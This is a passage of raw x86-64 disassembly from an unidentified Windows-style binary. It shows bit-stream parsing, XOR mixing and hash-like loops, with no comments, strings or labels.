   14004bc24:	mov    r10,rdx
   14004bc27:	shl    r10,0x8
   14004bc2b:	movzx  edx,BYTE PTR [rcx+r9*1]
   14004bc30:	inc    r9
   14004bc33:	or     rdx,r10
   14004bc36:	jmp    0x14004bc19
   14004bc38:	push   0xffffffffffffffff
   14004bc3a:	pop    r9
   14004bc3c:	mov    r10,r9
   14004bc3f:	mov    ecx,r8d
   14004bc42:	shl    r10,cl
   14004bc45:	cmp    r8,0x40
   14004bc49:	not    r10
   14004bc4c:	cmovae r10,r9
   14004bc50:	and    r13d,0x7
   14004bc54:	lea    ecx,[r8+r13*1]
   14004bc58:	neg    cl
   14004bc5a:	shrd   rdx,rax,cl
   14004bc5e:	shr    rax,cl
   14004bc61:	test   cl,0x40
   14004bc64:	cmove  rax,rdx
   14004bc68:	and    rax,r10
   14004bc6b:	mov    rsi,QWORD PTR [rbp+0xd60]
   14004bc72:	add    r8,0x7
   14004bc76:	bswap  rax
   14004bc79:	shr    r8,0x3
   14004bc7d:	mov    QWORD PTR [rbp+0x1060],rax
   14004bc84:	mov    r9,rsi
   14004bc87:	imul   r9,r8
   14004bc8b:	push   0x8
   14004bc8d:	pop    rcx
   14004bc8e:	sub    rcx,r8
   14004bc91:	dec    r8
   14004bc94:	mov    rax,QWORD PTR [rbp+0x1168]
   14004bc9b:	lea    r11,[rax+r9*1]
   14004bc9f:	mov    rax,r9
   14004bca2:	xor    edx,edx
   14004bca4:	push   0x14
   14004bca6:	pop    rdi
   14004bca7:	div    rdi
   14004bcaa:	cmp    rcx,0x8
   14004bcae:	je     0x14004bcd4
   14004bcb0:	cmp    r8,0x7
   14004bcb4:	ja     0x140059d80
   14004bcba:	imul   rax,rax,0xffffffffffffffec
   14004bcbe:	mov    al,BYTE PTR [r11+rax*1]
   14004bcc2:	xor    BYTE PTR [rbp+rcx*1+0x1060],al
   14004bcc9:	inc    rcx
   14004bccc:	inc    r11
   14004bccf:	inc    r9
   14004bcd2:	jmp    0x14004bc9f
   14004bcd4:	mov    r11,QWORD PTR [rbp+0x1060]
   14004bcdb:	bswap  r11
   14004bcde:	and    r11,r10
   14004bce1:	inc    rsi
   14004bce4:	mov    QWORD PTR [rbp+0xd60],rsi
   14004bceb:	mov    r9,QWORD PTR [rbp+0xdd0]
   14004bcf2:	mov    rax,QWORD PTR [rbp+0xdc0]
   14004bcf9:	mov    r8,QWORD PTR [rbp+0xdc8]
   14004bd00:	mov    rdx,r9
   14004bd03:	sub    rdx,r8
   14004bd06:	sub    rdx,rax
   14004bd09:	mov    rcx,QWORD PTR [rbp+0xd20]
   14004bd10:	cmp    rdx,rcx
   14004bd13:	cmovae rdx,rcx
   14004bd17:	cmp    rdx,0x1
   14004bd1b:	adc    rdx,0x0
   14004bd1f:	mov    r10d,ecx
   14004bd22:	sub    r10d,edx
   14004bd25:	and    r10b,0x3f
   14004bd29:	cmp    rcx,rdx
   14004bd2c:	movzx  ecx,r10b
   14004bd30:	mov    r10d,0x0
   14004bd36:	cmovbe ecx,r10d
   14004bd3a:	shr    r11,cl
   14004bd3d:	mov    r10,QWORD PTR [rbp+0xdb0]
   14004bd44:	mov    rsi,QWORD PTR [rbp+0xdb8]
   14004bd4b:	mov    ecx,edx
   14004bd4d:	shld   rsi,r10,cl
   14004bd51:	shl    r10,cl
   14004bd54:	test   dl,0x40
   14004bd57:	cmovne rsi,r10
   14004bd5b:	mov    ecx,0x0
   14004bd60:	cmove  rcx,r10
   14004bd64:	or     rcx,r11
   14004bd67:	mov    QWORD PTR [rbp+0xdb8],rsi
   14004bd6e:	mov    QWORD PTR [rbp+0xdb0],rcx
   14004bd75:	add    rax,rdx
   14004bd78:	mov    QWORD PTR [rbp+0xdc0],rax
   14004bd7f:	jmp    0x14004b827
   14004bd84:	add    rax,0xfffffffffffffff8
   14004bd88:	mov    QWORD PTR [rbp+0xdc0],rax
   14004bd8f:	mov    r9,QWORD PTR [rbp+0xdb8]
   14004bd96:	mov    r10,r9
   14004bd99:	mov    ecx,eax
   14004bd9b:	shr    r10,cl
   14004bd9e:	mov    r11,QWORD PTR [rbp+0xdb0]
   14004bda5:	mov    rdx,r11
   14004bda8:	shrd   rdx,r9,cl
   14004bdac:	push   0xffffffffffffffff
   14004bdae:	pop    rdi
   14004bdaf:	mov    rsi,rdi
   14004bdb2:	shl    rsi,cl
   14004bdb5:	test   al,0x40
   14004bdb7:	cmovne rdx,r10
   14004bdbb:	mov    ecx,0x0
   14004bdc0:	cmove  rcx,rsi
   14004bdc4:	cmove  rsi,rdi
   14004bdc8:	not    rsi
   14004bdcb:	not    rcx
   14004bdce:	and    rcx,r11
   14004bdd1:	and    rsi,r9
   14004bdd4:	test   rax,rax
   14004bdd7:	cmove  rsi,rax
   14004bddb:	cmove  rcx,rax
   14004bddf:	mov    QWORD PTR [rbp+0xdb0],rcx
   14004bde6:	mov    QWORD PTR [rbp+0xdb8],rsi
   14004bded:	add    r8,0x8
   14004bdf1:	mov    QWORD PTR [rbp+0xdc8],r8
   14004bdf8:	inc    rbx
   14004bdfb:	lea    rcx,[rbp+0x500]
   14004be02:	call   0x14003c141
   14004be07:	jmp    0x14004b7f8
   14004be0c:	mov    rcx,QWORD PTR [rbp+0x500]
   14004be13:	mov    rdx,QWORD PTR [rbp+0x508]
   14004be1a:	call   0x14006f7f7
   14004be1f:	lea    rcx,[rbp+0x500]
   14004be26:	push   0x8
   14004be28:	pop    rdx
   14004be29:	call   0x14003c111
   14004be2e:	xor    ebx,ebx
   14004be30:	cmp    rbx,0x8
   14004be34:	je     0x14004c444
   14004be3a:	mov    r8,QWORD PTR [rbp+0xdc8]
   14004be41:	mov    r9,QWORD PTR [rbp+0xdd0]
   14004be48:	lea    rax,[r8+0x8]
   14004be4c:	cmp    rax,r9
   14004be4f:	jbe    0x14004be58
   14004be51:	xor    edx,edx
   14004be53:	jmp    0x14004c430
   14004be58:	mov    rax,QWORD PTR [rbp+0xdc0]
   14004be5f:	cmp    rax,0x8
   14004be63:	jae    0x14004c3bc
   14004be69:	mov    rcx,QWORD PTR [rbp+0xd60]
   14004be70:	cmp    rcx,QWORD PTR [rbp+0xd68]
   14004be77:	jae    0x14004bebd
   14004be79:	mov    rcx,QWORD PTR [rbp+0xd18]
   14004be80:	mov    rdx,QWORD PTR [rbp+0xd58]
   14004be87:	cmp    rdx,rcx
   14004be8a:	jae    0x14004bebd
   14004be8c:	lea    rax,[r15+0x10]
   14004be90:	movzx  r13d,BYTE PTR [rax+rdx*1]
   14004be95:	and    r13d,0x7f
   14004be99:	lea    rax,[rdx+0x1]
   14004be9d:	cmp    rax,rcx
   14004bea0:	jae    0x14004becb
   14004bea2:	movzx  r8d,BYTE PTR [r15+rdx*1+0x11]
   14004bea8:	test   r8b,r8b
   14004beab:	jns    0x14004bec5
   14004bead:	shl    r13,0x7
   14004beb1:	and    r8d,0x7f
   14004beb5:	or     r13,r8
   14004beb8:	mov    rdx,rax
   14004bebb:	jmp    0x14004be99
   14004bebd:	xor    r11d,r11d
   14004bec0:	jmp    0x14004c338
   14004bec5:	inc    rdx
   14004bec8:	mov    rcx,rdx
   14004becb:	mov    QWORD PTR [rbp+0xd58],rcx
   14004bed2:	mov    rax,r13
   14004bed5:	shr    rax,0x8
   14004bed9:	mov    rsi,r13
   14004bedc:	shr    rsi,0x28
   14004bee0:	movaps XMMWORD PTR [rbp+0xfb0],xmm7
   14004bee7:	movaps XMMWORD PTR [rbp+0xfa0],xmm7
   14004beee:	movaps XMMWORD PTR [rbp+0xf90],xmm7
   14004bef5:	movaps XMMWORD PTR [rbp+0xf80],xmm7
   14004befc:	mov    DWORD PTR [rbp+0x7d0],eax
   14004bf02:	lea    rax,[rip+0x3c14f]        # 0x140088058
   14004bf09:	mov    QWORD PTR [rsp+0x20],rax
   14004bf0e:	lea    rcx,[rbp+0xf80]
   14004bf15:	push   0x4
   14004bf17:	pop    rdx
   14004bf18:	lea    r8,[rbp+0x7d0]
   14004bf1f:	mov    r9,rdx
   14004bf22:	call   0x1400638fe
   14004bf27:	mov    BYTE PTR [rbp+0xf84],sil
   14004bf2e:	mov    rsi,QWORD PTR [rbp+0xd30]
   14004bf35:	cmp    QWORD PTR [rbp+0xd78],rsi
   14004bf3c:	jbe    0x14004c06c
   14004bf42:	mov    r9,QWORD PTR [rbp+0xd38]
   14004bf49:	cmp    r9,0x4
   14004bf4d:	ja     0x140059d9c
   14004bf53:	mov    rcx,QWORD PTR [rbp+0xd40]
   14004bf5a:	cmp    rcx,0x5
   14004bf5e:	jae    0x140059dae
   14004bf64:	mov    r8,QWORD PTR [rbp+0xd78]
   14004bf6b:	cmp    r8,rsi
   14004bf6e:	je     0x140059dbc
   14004bf74:	mov    eax,DWORD PTR [rbp+rcx*4+0xd88]
   14004bf7b:	mov    cl,BYTE PTR [rbp+0xd48]
   14004bf81:	rol    eax,cl
   14004bf83:	sub    r8,rsi
   14004bf86:	xor    eax,DWORD PTR [rbp+r9*4+0xd88]
   14004bf8e:	xor    edx,edx
   14004bf90:	div    r8
   14004bf93:	mov    rdi,rdx
   14004bf96:	mov    rax,QWORD PTR [rbp+0xd80]
   14004bf9d:	mov    QWORD PTR [rbp+0x1060],rax
   14004bfa4:	cmp    rsi,0x40
   14004bfa8:	push   0x40
   14004bfaa:	pop    rax
   14004bfab:	cmovae rsi,rax
   14004bfaf:	movaps XMMWORD PTR [rbp+0x800],xmm7
   14004bfb6:	movaps XMMWORD PTR [rbp+0x7f0],xmm7
   14004bfbd:	movaps XMMWORD PTR [rbp+0x7e0],xmm7
   14004bfc4:	movaps XMMWORD PTR [rbp+0x7d0],xmm7
   14004bfcb:	lea    rcx,[rbp+0x7d0]
   14004bfd2:	mov    rdx,rsi
   14004bfd5:	call   0x14003c0b8
   14004bfda:	mov    r10,QWORD PTR [rbp+0xd78]
   14004bfe1:	test   r10,r10
   14004bfe4:	je     0x14004c032
   14004bfe6:	mov    rcx,rax
   14004bfe9:	mov    r8,rdx
   14004bfec:	mov    rax,rdx
   14004bfef:	add    rax,rdi
   14004bff2:	mov    r9,QWORD PTR [rbp+0xd70]
   14004bff9:	cmp    rax,r10
   14004bffc:	jbe    0x14004c01c
   14004bffe:	xor    r11d,r11d
   14004c001:	cmp    r8,r11
   14004c004:	je     0x14004c032
   14004c006:	lea    rax,[r11+rdi*1]
   14004c00a:	xor    edx,edx
   14004c00c:	div    r10
   14004c00f:	mov    al,BYTE PTR [r9+rdx*1]
   14004c013:	mov    BYTE PTR [rcx+r11*1],al
   14004c017:	inc    r11
   14004c01a:	jmp    0x14004c001
   14004c01c:	add    r9,rdi
   14004c01f:	xor    eax,eax
   14004c021:	cmp    r8,rax
   14004c024:	je     0x14004c032
   14004c026:	mov    dl,BYTE PTR [r9+rax*1]
   14004c02a:	mov    BYTE PTR [rcx+rax*1],dl
   14004c02d:	inc    rax
   14004c030:	jmp    0x14004c021
   14004c032:	mov    rcx,QWORD PTR [rbp+0xd28]
   14004c039:	xor    eax,eax
   14004c03b:	cmp    rsi,rax
   14004c03e:	je     0x14004c06c
   14004c040:	cmp    rcx,0x3f
   14004c044:	ja     0x140059d8e
   14004c04a:	mov    edx,eax
   14004c04c:	and    edx,0x7
   14004c04f:	mov    dl,BYTE PTR [rbp+rdx*1+0x1060]
   14004c056:	xor    dl,BYTE PTR [rbp+rax*1+0x7d0]
   14004c05d:	inc    rax
   14004c060:	mov    BYTE PTR [rbp+rcx*1+0xf80],dl
   14004c067:	inc    rcx
   14004c06a:	jmp    0x14004c03b
   14004c06c:	movaps XMMWORD PTR [rbp+0x1090],xmm7
   14004c073:	movaps XMMWORD PTR [rbp+0x1080],xmm7
   14004c07a:	movaps XMMWORD PTR [rbp+0x1070],xmm7
   14004c081:	movaps XMMWORD PTR [rbp+0x1060],xmm7
   14004c088:	xor    eax,eax
   14004c08a:	cmp    rax,0x40
   14004c08e:	je     0x14004c0a6
   14004c090:	mov    ecx,DWORD PTR [rbp+rax*1+0xf80]
   14004c097:	bswap  ecx
   14004c099:	mov    DWORD PTR [rbp+rax*1+0x1060],ecx
   14004c0a0:	add    rax,0x4
   14004c0a4:	jmp    0x14004c08a
   14004c0a6:	movups xmm0,XMMWORD PTR [rbp+0xd88]
   14004c0ad:	mov    eax,DWORD PTR [rbp+0xd98]
   14004c0b3:	movups XMMWORD PTR [rbp+0x7d0],xmm0
   14004c0ba:	mov    DWORD PTR [rbp+0x7e0],eax
   14004c0c0:	and    DWORD PTR [rbp+0x7e4],0x0
   14004c0c7:	movaps xmm0,XMMWORD PTR [rbp+0x1060]
   14004c0ce:	movaps xmm1,XMMWORD PTR [rbp+0x1070]
   14004c0d5:	movaps xmm2,XMMWORD PTR [rbp+0x1080]
   14004c0dc:	movaps xmm3,XMMWORD PTR [rbp+0x1090]
   14004c0e3:	lea    rax,[rbp+0x7e8]
   14004c0ea:	movups XMMWORD PTR [rax+0x30],xmm3
   14004c0ee:	movups XMMWORD PTR [rax+0x20],xmm2
   14004c0f2:	movups XMMWORD PTR [rax+0x10],xmm1
   14004c0f6:	movups XMMWORD PTR [rax],xmm0
   14004c0f9:	call   0x140064214
   14004c0fe:	mov    al,BYTE PTR [rip+0x4c989]        # 0x140098a8d
   14004c104:	cmp    al,0x1
   14004c106:	je     0x14004c14f
   14004c108:	movzx  eax,al
   14004c10b:	cmp    eax,0x2
   14004c10e:	je     0x14004c1f5
   14004c114:	and    DWORD PTR [rbp+0x400],0x0
   14004c11b:	lea    rcx,[rip+0xfffffffffffb4f5e]        # 0x140001080
   14004c122:	mov    rdx,QWORD PTR [rbp+0x1150]
   14004c129:	push   0x40
   14004c12b:	pop    r8
   14004c12d:	lea    r9,[rbp+0x400]
   14004c134:	call   QWORD PTR [rip+0x486ce]        # 0x140094808
   14004c13a:	test   eax,eax
   14004c13c:	sete   cl
   14004c13f:	inc    cl
   14004c141:	mov    BYTE PTR [rip+0x4c946],cl        # 0x140098a8d
   14004c147:	test   eax,eax
   14004c149:	je     0x14004c1f5
   14004c14f:	mov    al,BYTE PTR [rip+0x4ca63]        # 0x140098bb8
   14004c155:	cmp    al,0x1
   14004c157:	je     0x14004c17c
   14004c159:	movzx  eax,al
   14004c15c:	test   eax,eax
   14004c15e:	jne    0x14004c1f5
   14004c164:	call   0x140065d51
   14004c169:	test   rax,rax
   14004c16c:	sete   cl
   14004c16f:	inc    cl
   14004c171:	mov    BYTE PTR [rip+0x4ca41],cl        # 0x140098bb8
   14004c177:	test   rax,rax
   14004c17a:	je     0x14004c1f5
   14004c17c:	call   0x140064227
   14004c181:	mov    eax,0xc8c291de
   14004c186:	xchg   DWORD PTR [rip+0x4c954],eax        # 0x140098ae0
   14004c18c:	call   QWORD PTR [rip+0x484be]        # 0x140094650
   14004c192:	mov    eax,eax
   14004c194:	mov    QWORD PTR [rip+0x4be65],rax        # 0x140098000
   14004c19b:	lea    rcx,[rbp+0x7d0]
   14004c1a2:	push   0xffffffffffffffff
   14004c1a4:	pop    rdx
   14004c1a5:	call   0x14002b840
   14004c1aa:	xor    eax,eax
   14004c1ac:	xchg   DWORD PTR [rip+0x4c92e],eax        # 0x140098ae0
   14004c1b2:	mov    BYTE PTR [rip+0x4c8d5],0x0        # 0x140098a8e
   14004c1b9:	mov    eax,DWORD PTR [rbp+0x7d0]
   14004c1bf:	add    DWORD PTR [rbp+0xd88],eax
   14004c1c5:	mov    eax,DWORD PTR [rbp+0x7d4]
   14004c1cb:	add    DWORD PTR [rbp+0xd8c],eax
   14004c1d1:	mov    eax,DWORD PTR [rbp+0x7d8]
   14004c1d7:	add    DWORD PTR [rbp+0xd90],eax
   14004c1dd:	mov    eax,DWORD PTR [rbp+0x7dc]
   14004c1e3:	add    DWORD PTR [rbp+0xd94],eax
   14004c1e9:	mov    eax,DWORD PTR [rbp+0x7e0]
   14004c1ef:	add    DWORD PTR [rbp+0xd98],eax
   14004c1f5:	mov    BYTE PTR [rip+0x4c890],0x0        # 0x140098a8c
   14004c1fc:	movaps XMMWORD PTR [rbp+0x7f0],xmm7
   14004c203:	movaps XMMWORD PTR [rbp+0x7e0],xmm7
   14004c20a:	movaps XMMWORD PTR [rbp+0x7d0],xmm7
   14004c211:	xor    eax,eax
   14004c213:	cmp    rax,0x14
   14004c217:	je     0x14004c22f
   14004c219:	mov    ecx,DWORD PTR [rbp+rax*1+0xd88]
   14004c220:	bswap  ecx
   14004c222:	mov    DWORD PTR [rbp+rax*1+0x7d0],ecx
   14004c229:	add    rax,0x4
   14004c22d:	jmp    0x14004c213
   14004c22f:	mov    r8,QWORD PTR [rbp+0xd20]
   14004c236:	mov    eax,r13d
   14004c239:	shr    eax,0x3
   14004c23c:	and    eax,0x1f
   14004c23f:	lea    rcx,[rax+rbp*1]
   14004c243:	add    rcx,0x7d0
   14004c24a:	xor    r9d,r9d
   14004c24d:	xor    edx,edx
   14004c24f:	xor    eax,eax
   14004c251:	cmp    r9,0x10
   14004c255:	je     0x14004c270
   14004c257:	shld   rax,rdx,0x8
   14004c25c:	mov    r10,rdx
   14004c25f:	shl    r10,0x8
   14004c263:	movzx  edx,BYTE PTR [rcx+r9*1]
   14004c268:	inc    r9
   14004c26b:	or     rdx,r10
   14004c26e:	jmp    0x14004c251
   14004c270:	push   0xffffffffffffffff
   14004c272:	pop    r9
   14004c274:	mov    r10,r9
   14004c277:	mov    ecx,r8d
   14004c27a:	shl    r10,cl
   14004c27d:	cmp    r8,0x40
   14004c281:	not    r10
   14004c284:	cmovae r10,r9
   14004c288:	and    r13d,0x7
   14004c28c:	lea    ecx,[r8+r13*1]
   14004c290:	neg    cl
   14004c292:	shrd   rdx,rax,cl
   14004c296:	shr    rax,cl
   14004c299:	test   cl,0x40
   14004c29c:	cmove  rax,rdx
   14004c2a0:	and    rax,r10
   14004c2a3:	mov    rsi,QWORD PTR [rbp+0xd60]
   14004c2aa:	add    r8,0x7
   14004c2ae:	bswap  rax
   14004c2b1:	shr    r8,0x3
   14004c2b5:	mov    QWORD PTR [rbp+0x1060],rax
   14004c2bc:	mov    r9,rsi
   14004c2bf:	imul   r9,r8
   14004c2c3:	push   0x8
   14004c2c5:	pop    rcx
   14004c2c6:	sub    rcx,r8
   14004c2c9:	dec    r8
   14004c2cc:	mov    rax,QWORD PTR [rbp+0x1168]
   14004c2d3:	lea    r11,[rax+r9*1]
   14004c2d7:	mov    rax,r9
   14004c2da:	xor    edx,edx
   14004c2dc:	push   0x14
   14004c2de:	pop    rdi
   14004c2df:	div    rdi
   14004c2e2:	cmp    rcx,0x8
   14004c2e6:	je     0x14004c30c
   14004c2e8:	cmp    r8,0x7
   14004c2ec:	ja     0x140059d80
   14004c2f2:	imul   rax,rax,0xffffffffffffffec
   14004c2f6:	mov    al,BYTE PTR [r11+rax*1]
   14004c2fa:	xor    BYTE PTR [rbp+rcx*1+0x1060],al
   14004c301:	inc    rcx
   14004c304:	inc    r11
   14004c307:	inc    r9
   14004c30a:	jmp    0x14004c2d7
   14004c30c:	mov    r11,QWORD PTR [rbp+0x1060]
   14004c313:	bswap  r11
   14004c316:	and    r11,r10
   14004c319:	inc    rsi
   14004c31c:	mov    QWORD PTR [rbp+0xd60],rsi
   14004c323:	mov    r9,QWORD PTR [rbp+0xdd0]
   14004c32a:	mov    rax,QWORD PTR [rbp+0xdc0]
   14004c331:	mov    r8,QWORD PTR [rbp+0xdc8]
   14004c338:	mov    rdx,r9
   14004c33b:	sub    rdx,r8
   14004c33e:	sub    rdx,rax
   14004c341:	mov    rcx,QWORD PTR [rbp+0xd20]
   14004c348:	cmp    rdx,rcx
   14004c34b:	cmovae rdx,rcx
   14004c34f:	cmp    rdx,0x1
   14004c353:	adc    rdx,0x0
   14004c357:	mov    r10d,ecx
   14004c35a:	sub    r10d,edx
   14004c35d:	and    r10b,0x3f
   14004c361:	cmp    rcx,rdx
   14004c364:	movzx  ecx,r10b
   14004c368:	mov    r10d,0x0
   14004c36e:	cmovbe ecx,r10d
   14004c372:	shr    r11,cl
   14004c375:	mov    r10,QWORD PTR [rbp+0xdb0]
   14004c37c:	mov    rsi,QWORD PTR [rbp+0xdb8]
   14004c383:	mov    ecx,edx
   14004c385:	shld   rsi,r10,cl
   14004c389:	shl    r10,cl
   14004c38c:	test   dl,0x40
   14004c38f:	cmovne rsi,r10
   14004c393:	mov    ecx,0x0
   14004c398:	cmove  rcx,r10
   14004c39c:	or     rcx,r11
   14004c39f:	mov    QWORD PTR [rbp+0xdb8],rsi
   14004c3a6:	mov    QWORD PTR [rbp+0xdb0],rcx
   14004c3ad:	add    rax,rdx
   14004c3b0:	mov    QWORD PTR [rbp+0xdc0],rax
   14004c3b7:	jmp    0x14004be5f
   14004c3bc:	add    rax,0xfffffffffffffff8
   14004c3c0:	mov    QWORD PTR [rbp+0xdc0],rax
   14004c3c7:	mov    r9,QWORD PTR [rbp+0xdb8]
   14004c3ce:	mov    r10,r9
   14004c3d1:	mov    ecx,eax
   14004c3d3:	shr    r10,cl
   14004c3d6:	mov    r11,QWORD PTR [rbp+0xdb0]
   14004c3dd:	mov    rdx,r11
   14004c3e0:	shrd   rdx,r9,cl
   14004c3e4:	push   0xffffffffffffffff
   14004c3e6:	pop    rdi
   14004c3e7:	mov    rsi,rdi
   14004c3ea:	shl    rsi,cl
   14004c3ed:	test   al,0x40
   14004c3ef:	cmovne rdx,r10
   14004c3f3:	mov    ecx,0x0
   14004c3f8:	cmove  rcx,rsi
   14004c3fc:	cmove  rsi,rdi
   14004c400:	not    rsi
   14004c403:	not    rcx
   14004c406:	and    rcx,r11
   14004c409:	and    rsi,r9
   14004c40c:	test   rax,rax
   14004c40f:	cmove  rsi,rax
   14004c413:	cmove  rcx,rax
   14004c417:	mov    QWORD PTR [rbp+0xdb0],rcx
   14004c41e:	mov    QWORD PTR [rbp+0xdb8],rsi
   14004c425:	add    r8,0x8
   14004c429:	mov    QWORD PTR [rbp+0xdc8],r8
   14004c430:	inc    rbx
   14004c433:	lea    rcx,[rbp+0x500]
   14004c43a:	call   0x14003c141
   14004c43f:	jmp    0x14004be30
   14004c444:	mov    r15,QWORD PTR [rbp+0x500]
   14004c44b:	mov    r13,QWORD PTR [rbp+0x508]
   14004c452:	mov    rsi,QWORD PTR [rbp+0x510]
   14004c459:	add    rsi,r13
   14004c45c:	mov    QWORD PTR [rbp+0x7d0],r13
   14004c463:	mov    QWORD PTR [rbp+0x7d8],rsi
   14004c46a:	mov    QWORD PTR [rbp+0x7e0],0x8
   14004c475:	and    QWORD PTR [rbp+0x7e8],0x0
   14004c47d:	xor    edi,edi
   14004c47f:	lea    rcx,[rbp+0x7d0]
   14004c486:	call   0x14003ba96
   14004c48b:	test   rdx,rdx
   14004c48e:	je     0x14004c4a0
   14004c490:	movzx  edx,BYTE PTR [rdx]
   14004c493:	shl    eax,0x3
   14004c496:	mov    ecx,eax
   14004c498:	shl    rdx,cl
   14004c49b:	or     rdi,rdx
   14004c49e:	jmp    0x14004c47f
   14004c4a0:	mov    r9,rdi
   14004c4a3:	movabs rax,0x4f1bbcdca8279931
   14004c4ad:	imul   r9,rax
   14004c4b1:	rol    r9,0x11
   14004c4b5:	xor    r9,rdi
   14004c4b8:	mov    r10,r9
   14004c4bb:	movabs rax,0x6b1f30a8d4c752e9
   14004c4c5:	xor    r10,rax
   14004c4c8:	movaps XMMWORD PTR [rbp+0x7d0],xmm7
   14004c4cf:	movaps XMMWORD PTR [rbp+0x7e0],xmm7
   14004c4d6:	movaps XMMWORD PTR [rbp+0x7f0],xmm7
   14004c4dd:	movaps XMMWORD PTR [rbp+0x800],xmm7
   14004c4e4:	movaps XMMWORD PTR [rbp+0x810],xmm7
   14004c4eb:	movaps XMMWORD PTR [rbp+0x820],xmm7
   14004c4f2:	movaps XMMWORD PTR [rbp+0x830],xmm7
   14004c4f9:	movaps XMMWORD PTR [rbp+0x840],xmm7
   14004c500:	movabs rax,0x1f91b0e3369d229e
   14004c50a:	xor    r9,rax
   14004c50d:	mov    r11,r10
   14004c510:	or     r11,0x1
   14004c514:	rol    r11,0x15
   14004c518:	lea    rdi,[r12+0x1]
   14004c51d:	xor    ebx,ebx
   14004c51f:	cmp    rbx,0x10
   14004c523:	je     0x14004c5ef
   14004c529:	mov    rax,rbx
   14004c52c:	movabs rcx,0x32a27dbe0b6bcf37
   14004c536:	imul   rax,rcx
   14004c53a:	rol    rax,0x20
   14004c53e:	xor    rax,r10
   14004c541:	mov    rcx,r11
   14004c544:	push   0x7
   14004c546:	pop    rdx
   14004c547:	mov    r8,r9
   14004c54a:	sub    edx,0x1
   14004c54d:	jb     0x14004c583
   14004c54f:	mov    r14,rcx
   14004c552:	xor    r14,rax
   14004c555:	add    r14,r8
   14004c558:	rol    r14,0x28
   14004c55c:	add    rax,r14
   14004c55f:	rol    rax,0xf
   14004c563:	mov    r8,rax
   14004c566:	shr    r8,0x1d
   14004c56a:	xor    rax,r8
   14004c56d:	movabs r8,0x79ca1cd2f36bd757
   14004c577:	imul   r14,r8
   14004c57b:	add    rcx,r11
   14004c57e:	mov    r8,r14
   14004c581:	jmp    0x14004c54a
   14004c583:	lea    rcx,[rbx*4+0x4]
   14004c58b:	xor    r14d,r14d
   14004c58e:	cmp    rcx,QWORD PTR [rbp+0x1180]
   14004c595:	ja     0x14004c5aa
   14004c597:	lea    rcx,[rbx*4+0x0]
   14004c59f:	mov    rdx,QWORD PTR [rbp+0x1148]
   14004c5a6:	mov    r14d,DWORD PTR [rdx+rcx*1]
   14004c5aa:	xor    r8,rax
   14004c5ad:	mov    rax,r8
   14004c5b0:	shr    rax,0x18
   14004c5b4:	xor    edx,edx
   14004c5b6:	push   0x1f
   14004c5b8:	pop    rcx
   14004c5b9:	div    ecx
   14004c5bb:	lea    ecx,[rdx+0x1]
   14004c5be:	ror    r14d,cl
   14004c5c1:	mov    rax,r8
   14004c5c4:	shr    rax,0x10
   14004c5c8:	mov    rcx,r8
   14004c5cb:	shr    rcx,0x28
   14004c5cf:	xor    ecx,eax
   14004c5d1:	xor    r8d,ecx
   14004c5d4:	xor    r8d,r14d
   14004c5d7:	mov    rax,r8
   14004c5da:	xor    edx,edx
   14004c5dc:	div    rdi
   14004c5df:	mov    QWORD PTR [rbp+rbx*8+0x7d0],rdx
   14004c5e7:	inc    rbx
   14004c5ea:	jmp    0x14004c51f
   14004c5ef:	and    QWORD PTR [rbp+0xf80],0x0
   14004c5f7:	mov    QWORD PTR [rbp+0x1060],r13
   14004c5fe:	mov    QWORD PTR [rbp+0x1068],rsi
   14004c605:	mov    QWORD PTR [rbp+0x1070],0x8
   14004c610:	and    QWORD PTR [rbp+0x1078],0x0
   14004c618:	lea    rcx,[rbp+0x1060]
   14004c61f:	call   0x14003ba96
   14004c624:	test   rdx,rdx
   14004c627:	je     0x14004c63e
   14004c629:	cmp    rax,0x7
   14004c62d:	ja     0x14004a57a
   14004c633:	mov    cl,BYTE PTR [rdx]
   14004c635:	mov    BYTE PTR [rbp+rax*1+0xf80],cl
   14004c63c:	jmp    0x14004c618
   14004c63e:	mov    ecx,0x80
   14004c643:	lea    rdi,[rbp+0x1060]
   14004c64a:	lea    rsi,[rbp+0x7d0]
   14004c651:	rep movs BYTE PTR [rdi],BYTE PTR [rsi]
   14004c653:	mov    rsi,QWORD PTR [rbp+0xf80]
   14004c65a:	mov    rcx,r15
   14004c65d:	mov    rdx,r13
   14004c660:	call   0x14006f7f7
   14004c665:	mov    rcx,QWORD PTR [rbp+0x1138]
   14004c66c:	mov    rdx,QWORD PTR [rbp+0x1148]
   14004c673:	call   0x14006f7f7
   14004c678:	mov    QWORD PTR [rbp+0xcc0],rsi
   14004c67f:	mov    rax,QWORD PTR [rbp+0xd58]
   14004c686:	sub    QWORD PTR [rbp+0x1160],rax
   14004c68d:	jb     0x14005a158
   14004c693:	mov    ecx,DWORD PTR [rbp+0x6c8]
   14004c699:	mov    DWORD PTR [rbp+0xf80],ecx
   14004c69f:	mov    ecx,DWORD PTR [rbp+0x1134]
   14004c6a5:	mov    DWORD PTR [rbp+0xf84],ecx
   14004c6ab:	mov    ecx,DWORD PTR [rbp+0x6c0]
   14004c6b1:	mov    DWORD PTR [rbp+0xf88],ecx
   14004c6b7:	mov    ecx,DWORD PTR [rbp+0xcb8]
   14004c6bd:	mov    DWORD PTR [rbp+0xf8c],ecx
   14004c6c3:	mov    ecx,DWORD PTR [rbp+0x5f0]
   14004c6c9:	mov    DWORD PTR [rbp+0xf90],ecx
   14004c6cf:	je     0x14005a158
   14004c6d5:	mov    rsi,QWORD PTR [rbp+0x1170]
   14004c6dc:	add    rsi,rax
   14004c6df:	mov    rcx,QWORD PTR [rbp+0x1158]
   14004c6e6:	lea    rdx,[rbp+0xf80]
   14004c6ed:	call   0x14003ad8d
   14004c6f2:	mov    eax,DWORD PTR [rbp+0xf90]
   14004c6f8:	lea    rdx,[rbp+0x7d8]
   14004c6ff:	mov    DWORD PTR [rdx+0x80],eax
   14004c705:	movups xmm0,XMMWORD PTR [rbp+0xf80]
   14004c70c:	movups XMMWORD PTR [rdx+0x70],xmm0
   14004c710:	mov    rax,QWORD PTR [rbp+0x730]
   14004c717:	lea    rcx,[rbp+0x7e8]
   14004c71e:	mov    QWORD PTR [rcx+0x20],rax
   14004c722:	mov    r9,QWORD PTR [rbp+0xf68]
   14004c729:	shr    r9,0x3d
   14004c72d:	mov    r8,QWORD PTR [rbp+0xca8]
   14004c734:	lea    rax,[r8*8+0x0]
   14004c73c:	neg    r9
   14004c73f:	mov    r13d,0x0
   14004c745:	sbb    r13,r13
   14004c748:	or     r13,rax
   14004c74b:	movaps xmm0,XMMWORD PTR [rbp+0x710]
   14004c752:	movaps xmm1,XMMWORD PTR [rbp+0x720]
   14004c759:	movups XMMWORD PTR [rcx+0x10],xmm1
